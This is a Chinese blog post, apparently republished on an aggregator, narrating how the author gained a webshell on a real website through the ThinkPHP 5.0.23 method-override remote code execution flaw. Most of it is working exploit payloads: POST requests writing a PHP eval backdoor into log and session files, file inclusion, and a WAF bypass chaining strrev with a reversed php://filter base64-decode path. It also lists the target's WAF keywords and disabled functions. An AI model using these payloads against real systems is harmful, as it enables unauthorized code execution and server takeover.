记一次有趣的thinkphp代码执行
==================

2019-12-05 [原文](/link/S0U1UThrUVBKTA==)

(adsbygoogle = window.adsbygoogle || \[\]).push({});

0x00 前言
-------

朋友之前给了个站，拿了很久终于拿下，简单记录一下。

0x01 基础信息
---------

*   漏洞点：tp 5 method 代码执行，payload如下
    
    ```
    
    
    1.  `POST /?s=captcha`
    
    3.  `_method=__construct&method=get&filter[]=assert&server[]=1&get[]=1`
    
    
    ```
    
*   无回显，根据payload 成功判断目标thinkphp 版本应为5.0.23
    
*   有waf，waf拦截了以下内容
    
    ```
    
    
    1.  `php标记:  
        `
    2.  `<?php  
        `
    3.  `<?=  
        `
    4.  `<?`
    
    6.  `php 函数:  
        `
    7.  `base64_decode  
        `
    8.  `file_get_contents  
        `
    9.  `convert_uuencode`
    
    11.  `关键字：  
        `
    12.  `php://`
    
    
    ```
    
*   linux
    
*   disable\_function禁用了以下函数
    
    ```
    
    
    1.  `passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server`
    
    
    ```
    
*   php 7.1.7 (虽然`assert` 函数不在disable\_function中，但已经无法用`call_user_func`回调调用)
    

0x02 突破
-------

现在tp 5 method代码执行开发出来的一些思路，不外乎如下两种：

1，写日志，包含日志 getshell 。payload如下：

```


1.  `写shell进日志  
    `
2.  `_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php eval($_POST['x'])?>`

4.  `通过日志包含getshell  
    `
5.  `_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../data/runtime/log/201901/21.log&x=phpinfo();`


```

2，写session，包含session getshell。payload如下：

```


1.  `写shell进session  
    `
2.  `POST /?s=captcha HTTP/1.1  
    `
3.  `Cookie: PHPSESSID=kking`

5.  `_method=__construct&filter[]=think\Session::set&method=get&get[]=<?php eval($_POST['x'])?>&server[]=1`

7.  `包含session getshell  
    `
8.  `POST /?s=captcha`

10.  `_method=__construct&method=get&filter[]=think\__include_file&get[]=tmp\sess_kking&server[]=1`


```

而这两种方式在这里都不可用，因为waf对`<?php`等关键字进行了拦截，还有其他办法吗？

### base64编码与php://filter伪协议

倘若能够对关键字进行变形或者编码就好了，比如base64编码:

假如我们的session 文件为`/tmp/sess_kking`，内容如下

```


1.  `PD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Oz8+  
    `
2.  `<?php @eval($_GET['r']);;?>`


```

因为最终的利用是通过`inlcude`方法进行包含，其实很容易想到可以利用`php://filter/read=convert.base64-decode/resource=/tmp/sess_kking`的方式进行解码

最终执行类似如下：

```


1.  include('php://filter/read=convert.base64-decode/resource=/tmp/sess\_kking');


```

但是session里面是会有其他字符的

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMDctZDhjNTE4OTAtYzc5Yy0xLnBuZw==.jpg)

如何让`php://filter`正确的解码呢?  
p神的[谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)文章有谈到如何巧妙用`php://filter`与`base64`编码绕过死亡`exit`

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMDgtZDhmYWU0MGMtYzc5Yy0xLnBuZw==.jpg)

那么这里也一样，我们只要构造合适的字符，使得我们的webshell能够正确被base64解码即可。

本地测试

第一步，设置session

```


1.  POST /?s\=captcha

3.  \_method\=\_\_construct&filter\[\]=think\\Session::set&method\=get&get\[\]=adPD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Oz8%2bab&server\[\]=1


```

(注意：这里的+号需要用`urlencode`编码为%2b，不然会在写入`session`的时候被urldecode为空格，导致编码解码失败)。

疑问点1：为什么不用`PD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Pz4= (<?php @eval($_GET['r']);?>)`而是`PD9waHAgQGV2YWwoJF9HRVRbJ3InXSk7Oz8+ (<?php @eval($_GET['r']);;?>)` 呢，

答：是因为直接使用前者无论怎么拼凑字符，都没法正常解码。

疑问点2：为什么`payload`前后会有两个`ab`？

答：是为了让`shell payload` 的前后两串字符串满足base64解码的长度，使其能正常解码。

第二步，包含，成功执行代码：

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMDgtZDkzYTFlZjYtYzc5Yy0xLnBuZw==.jpg)

本地测试如此，但是在目标测试会发现执行不了，因为我们的payload使用了`php://filter`的协议包含了`php://`关键字  
![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltZzIwMTguY25ibG9ncy5jb20vYmxvZy8xMjA1NDc3LzIwMTkwOC8xMjA1NDc3LTIwMTkwODI3MTAxNjAwMjQxLTE2MTMyNTU0NC5wbmc=.jpg)

怎么让才能让其没有关键字呢？

### tp 5 method代码执行的细节

让我们仔细观察代码执行的`Request.php`的`filterValue`方法是如何执行代码的。

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMDktZDljMGM5MDYtYzc5Yy0xLnBuZw==.jpg)

我们注意到`filter`其实是可以传递多个的，同时参数为参数引用。

那么其实我们就可以传递多个`filter`来对`value`进行多次传递处理。如先`base64_decode`后将解码后的值传递给`include`进行包含。

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMDktZGEwZDA1ZTYtYzc5Yy0xLnBuZw==.jpg)

但在线上这个waf是对`base64_decode`这个函数进行了过滤的，经过测试发现可以使用`strrev`反转函数突破。考虑到waf的问题，我们使用的`shell payload`加多一层base64编码。

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMTAtZGEzMzE2ZjAtYzc5Yy0xLnBuZw==.jpg)

同样道理这里的payload为什么要多几个分号就不需要再解释了

回到我们的`getshell`步骤，在目标上执行

1，设置`session`：

```


1.  `POST /?s=captcha  
    `
2.  `Cookie: PHPSESSID=kktest`

4.  `_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1`


```

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMTAtZGE3MDAyZjQtYzc5Yy0xLnBuZw==.jpg)

(`payload`前后两个`ab`同样是为了`base64`解码凑字符的原因)

2，文件包含

```


1.  `POST /?s=captcha&r=cGhwaW5mbygpOw==`

3.  `_method=__construct&filter[]=strrev&filter[]=think\__include_file&method=get&server[]=1&get[]=tsetkk_sses/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php`


```

![](https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL3h6ZmlsZS5hbGl5dW5jcy5jb20vbWVkaWEvdXBsb2FkL3BpY3R1cmUvMjAxOTA4MjYwOTAwMTAtZGFiM2I4YjQtYzc5Yy0xLnBuZw==.jpg)

最终成功绕过防火墙`getshell`。

0x03 总结
-------

总的来说挺有趣的，搞了很久，最终成功`getshell`也是非常的爽。（好在没放弃：）  
不妥之处，烦请指出~

(adsbygoogle = window.adsbygoogle || \[\]).push({});

[记一次有趣的thinkphp代码执行的更多相关文章](/R/KE5Q8kQPJL/)
-------------------------------------------

1.  [记一次有趣的tp5代码执行](https://www.shuzhiduo.com/A/o75NEg6PJW/)
    
    0x00 前言 朋友之前给了个站,拿了很久终于拿下,简单记录一下. 0x01 基础信息 漏洞点:tp 5 method 代码执行,payload如下 POST /?s=captcha \_method= ...
    
2.  [thinkphp 代码执行](https://www.shuzhiduo.com/A/D8542qwQzE/)
    
    相关漏洞:http://loudong.360.cn/vul/info/id/2919 ThinkPHP 开启lite模式后,会加载ThinkPHP/Extend/Mode/Lite/Dispache ...
    
3.  [记一次海洋cms任意代码执行漏洞拿shell(url一句话)](https://www.shuzhiduo.com/A/KE5Q8x3ZJL/)
    
    实验环境:海洋CMS6.54(后续版本已该洞已补) 1.后台登录尝试 这个站点是个测试站,站里没什么数据. 进入admin.php,是带验证码的后台登录系统,没有验证码的可以用bp爆破.有验证码的也有 ...
    
4.  [Thinkphp 3.0-3.1版代码执行漏洞](https://www.shuzhiduo.com/A/VGzlVVL75b/)
    
    近日360库带计划中播报的ThinkPHP扩展类库的漏洞已经查明原因:系官方扩展模式中的Lite精简模式中存在可能的漏洞(原先核心更新安全的时候 并没有更新模式扩展部分,现已更新).对于使用标准模式或 ...
    
5.  [thinkphp 2.1代码执行及路由分析](https://www.shuzhiduo.com/A/pRdBypX75n/)
    
    Dispatcher.class.php这个文件中是url路由,由于第一次正式看路由那块,所以就从头开始一行一行看把. 首先是dispatch函数 是37行到140行 这个函数是做映射用,把url映射 ...
    
6.  [Thinkphp V5.X 远程代码执行漏洞 - POC（搬运）](https://www.shuzhiduo.com/A/KE5QrA6jdL/)
    
    文章来源:lsh4ck's Blog 原文链接: https://www.77169.com/html/237165.html Thinkphp 5.0.22   http://192.168.1.1 ...
    
7.  [\[漏洞分析\]thinkcmf 1.6.0版本从sql注入到任意代码执行](https://www.shuzhiduo.com/A/pRdBG2M6zn/)
    
    0x00 前言 该漏洞源于某真实案例,虽然攻击没有用到该漏洞,但在分析攻击之后对该版本的cmf审计之后发现了,也算是有点机遇巧合的味道,我没去找漏洞,漏洞找上了我XD thinkcmf 已经非常久远了 ...
    
8.  [PHPMailer &lt; 5.2.18 远程代码执行漏洞（CVE-2016-10033）](https://www.shuzhiduo.com/A/LPdo8OAjz3/)
    
    PHPMailer < 5.2.18 Remote Code Execution 本文将简单展示一下PHPMailer远程代码执行漏洞(CVE-2016-10033)的利用过程,使用的是别人已经 ...
    
9.  [ThinkPHP5 远程代码执行漏洞被入侵日志，升级最新版本解决](https://www.shuzhiduo.com/A/1O5EVmprd7/)
    
    2018年12月9日,ThinkPHP团队发布了一个补丁更新,修复了一处由于路由解析缺陷导致的代码执行漏洞.该漏洞危害程度非常高,默认环境配置即可导致远程代码执行.经过启明星辰ADLab安全研究员对T ...
    

随机推荐
----

1.  [HDU3466 Proud Merchants\[背包DP 条件限制\]](https://www.shuzhiduo.com/A/n2d9q0gdDv/)
    
    Proud Merchants Time Limit: 2000/1000 MS (Java/Others)    Memory Limit: 131072/65536 K (Java/Others) ...
    
2.  [DOM样式操作](https://www.shuzhiduo.com/A/rV5742qXdP/)
    
    CSS 到 DOM的抽象 通过操作 CSS 对应的 DOM对象来更新CSS样式 换肤操作 如何获取实际的样式(不仅有行内,更有页面和外联样式表中定义的样式) 样式表分为三类: 外联,页面,行内 内部样 ...
    
3.  [SQL 随笔](https://www.shuzhiduo.com/A/MyJxWB0Rzn/)
    
    自动生成10位ID DECLARE @num INT ) )) ) Date的运算 DECLARE @StartDate DATETIME , GetDate()) --add day PRINT @ ...
    
4.  [jdk源码-&gt;多线程-&gt;Thread](https://www.shuzhiduo.com/A/MyJxeoRp5n/)
    
    线程的创建 java提供了三种创建线程的方法: 通过继承 Thread 类本身: 通过实现 Runnable 接口: 通过 Callable 和 Future 创建线程. 继承Thread类 步骤: ...
    
5.  [一文让你彻底理解 Java NIO 核心组件](https://www.shuzhiduo.com/A/KE5QwKYkzL/)
    
    背景知识 同步.异步.阻塞.非阻塞 首先,这几个概念非常容易搞混淆,但NIO中又有涉及,所以总结一下. 同步:API调用返回时调用者就知道操作的结果如何了(实际读取/写入了多少字节). 异步:相对于同 ...
    
6.  [Ubuntu中拷贝文件的操作](https://www.shuzhiduo.com/A/lk5a98Wo51/)
    
    cp(copy)命令 该命令的功能是将给出的文件或目录拷贝到另一文件或目录中. 语法: cp \[选项\] 源文件或目录 目标文件或目录 说明:该命令把指定的源文件复制到目标文件或把多个源文件复制到目标目 ...
    
7.  [Swift 里的指针](https://www.shuzhiduo.com/A/A7zg7KOYz4/)
    
    ￼ 基础知识 指针的内存状态 typed? initiated? ❌ ❌ ✅ ❌ ✅ ✅ 之前分配的内存可能被释放,使得指针指向了未被分配的内存. 有两种方式可以使得指针指向的内存处于Uninitia ...
    
8.  [CPU个数、CPU核心数、CPU线程数](https://www.shuzhiduo.com/A/GBJrrM13J0/)
    
    CPU个数.CPU核心数.CPU线程数 我们在选购电脑的时候,CPU是一个需要考虑到核心因素,因为它决定了电脑的性能等级.CPU从早期的单核,发展到现在的双核,多核.CPU除了核心数之外,还有线程数之 ...
    
9.  [pygme 安装](https://www.shuzhiduo.com/A/n2d9GYZVJD/)
    
    输入pip install pygame-1.9.3-cp36-cp36m-win32.whl ModuleNotFoundError: No module named 'requests' pip ...
    
10.  [Linux 定时任务crontab\_014](https://www.shuzhiduo.com/A/LPdoLAEBz3/)
    
    1.  crontab命令概念 crontab命令用于设置周期性被执行的指令.该命令从标准输入设备读取指令,并将其存放于“crontab”文件中,以供之后读取和执行. cron 系统调度进程. 可以使 ...